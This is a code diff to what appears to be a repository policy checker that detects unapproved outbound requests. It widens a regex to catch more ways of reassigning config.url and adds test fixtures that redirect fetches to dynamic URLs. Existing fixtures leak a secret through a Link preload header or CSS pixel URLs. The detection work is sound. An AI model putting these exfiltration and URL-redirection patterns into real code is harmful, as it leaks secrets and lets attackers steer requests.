@@ -2011,7 +2011,7 @@ function hasAiRuntimeBoundary(content, path = "") {
   };
   const expectedConfigInitializers = approvedConfigInitializers[path];
   const usesApprovedConfigFetch = directFetchArguments.includes("`${config.url}${path}`");
-  const hasApprovedConfigMutation = /(?:\bconfig\s*(?:\.\s*url|\[\s*["'`]url["'`]\s*\])\s*(?:[+\-*/%]?=|\+\+|--)|\bdelete\s+config\s*(?:\.\s*url|\[\s*["'`]url["'`]\s*\])|\bObject\.(?:assign|defineProperty)\s*\(\s*config\b|\bReflect\.set\s*\(\s*config\s*,\s*["'`]url["'`])/i.test(normalizedContent);
+  const hasApprovedConfigMutation = /(?:\bconfig\s*(?:\.\s*url|\[\s*["'`]url["'`]\s*\])\s*(?:\*\*=|>>>=|<<=|>>=|&&=|\|\|=|\?\?=|[+\-*/%&|^]=|=(?!=)|\+\+|--)|\bdelete\s+config\s*(?:\.\s*url|\[\s*["'`]url["'`]\s*\])|\bObject\.(?:assign|defineProperty)\s*\(\s*config\b|\bReflect\.set\s*\(\s*config\s*,\s*["'`]url["'`])/i.test(normalizedContent);
   const hasUnapprovedConfigOrigin = usesApprovedConfigFetch && (
     !expectedConfigInitializers
     || configInitializers.length !== expectedConfigInitializers.length
@@ -2378,6 +2378,9 @@ for (const fixture of [
   { content: 'return new Response("", { headers: { Link: `<${env.REMOTE_URL}?data=${secret}>; rel=preload; as=image` } });', path: "apps/worker/src/capture-router.ts" },
   { content: 'const name = "Li" + "nk"; const h = new Headers(); h.set(name, `<${env.REMOTE_URL}?data=${secret}>; rel=preload; as=image`); return new Response("", { headers: h });', path: "apps/worker/src/capture-router.ts" },
   { content: 'const config = inspectSupabaseConfig(env).config; const config = ensureConfig(env); config.url = new URL(request.url).searchParams.get("target") ?? config.url; return fetch(`${config.url}${path}`);', path: "apps/worker/src/manual-router.ts" },
+  { content: 'const config = inspectSupabaseConfig(env).config; const config = ensureConfig(env); config.url &&= dynamicUrl; return fetch(`${config.url}${path}`);', path: "apps/worker/src/manual-router.ts" },
+  { content: 'const config = inspectSupabaseConfig(env).config; const config = ensureConfig(env); config["url"] ||= dynamicUrl; return fetch(`${config.url}${path}`);', path: "apps/worker/src/manual-router.ts" },
+  { content: 'const config = inspectSupabaseConfig(env).config; const config = ensureConfig(env); config.url ??= dynamicUrl; return fetch(`${config.url}${path}`);', path: "apps/worker/src/manual-router.ts" },
   { content: '<div style="background:u\\\\72l(//api.groq.com/pixel)"></div>', path: "apps/brand-site/public/css-escape-egress.html" },
   { content: '<div style="background-image:image-set(\'//api.groq.com/pixel\' 1x)"></div>', path: "apps/brand-site/public/css-image-set-egress.html" },
   { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
